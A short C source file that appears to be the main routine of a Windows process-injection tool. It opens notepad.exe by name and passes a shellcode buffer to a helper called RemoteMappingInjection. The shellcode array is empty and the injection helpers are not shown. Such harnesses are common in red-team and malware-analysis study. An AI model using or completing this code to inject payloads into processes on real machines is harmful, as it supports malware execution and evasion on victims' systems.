#include "box.h"

#define TARGET		L"notepad.exe"


int main()
{


	UCHAR Shellcode[] = {

	};

	DWORD PID = NULL;
	HANDLE hProcess = NULL, hThread = NULL;
	PVOID  pAddress = NULL;
	size_t shellsize = sizeof(Shellcode);

	INFO("Grabbing PID and Handle to Target Process: %s", TARGET);

	if (!GetRemoteId(TARGET, &PID, &hProcess))
	{
		PRINT_ERROR("GetRemoteId");
		return 1;
	}

	OKAY("[0x%p] Process Handle and [%d] PID Acquired!", hProcess, PID);
	INFO("Running Remote Mapping Injection...");

	if (!RemoteMappingInjection(hProcess, hThread, Shellcode, shellsize, pAddress))
	{
		PRINT_ERROR("RemoteMappingInjection");
		return 1;
	}

	OKAY("Success!");


	CHAR("Quit...");
	getchar();

	return 0;

}